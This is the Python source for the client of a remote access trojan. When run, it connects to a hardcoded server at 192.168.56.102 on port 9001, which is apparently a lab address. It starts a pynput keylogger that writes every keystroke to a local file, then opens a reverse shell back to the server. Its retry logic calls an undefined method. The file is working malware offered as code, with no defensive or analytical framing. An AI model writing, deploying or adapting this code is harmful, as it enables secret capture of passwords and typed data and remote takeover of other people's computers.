from connection import Connection
from rev_shell import Shell
import time
import socket
import logging
from pynput.keyboard import Key, Listener


class Client:
    """
    Performs all necessary actions for the RAT to function:
        - Creates socket
        - Logs key events to a file
        - Gets a reverse shell back to the server
    """

    def __init__(self, host: str, port: int, filename: str = "activity.txt") -> None:
        """
        Constructor
        :param host: The server's IP
        :param port: The server's port number
        :param filename: The file's name where the keystrokes are stored
        """
        self.host = host
        self.port = port
        self.filename = filename

        # Create client instance
        self.client = Connection(self.host, self.port)

        # Open socket connection back to server
        self.sock = self.client.connect()

        # Create shell instance
        self.shell = Shell(self.sock)

    def run(self) -> None:
        """
        Creates a connection between server and client.
        Starts logging key events
        Gets a reverse shell from client to server
        """
        # --------------------------KEYLOGGER--------------------------#

        logging.basicConfig(filename=(self.filename), level=logging.DEBUG, format='%(asctime)s: %(message)s')

        def on_press(key):
            logging.info(str(key))

        listener = Listener(on_press=on_press)
        listener.start()

        # --------------------------REV SHELL--------------------------#

        # Get a reverse shell back to server
        try:
            self.shell.get_shell()
        except socket.error:
            time.sleep(5)  # Wait 5s
            self.sock.close()  # Close erroneous connection
            self.hack()  # Retry

        # # --------------------------------------------------------------#

        # Close connection when finished
        self.sock.close()


if __name__ == "__main__":
    # Run RAT with specified IP and port
    Client("192.168.56.102", 9001).run()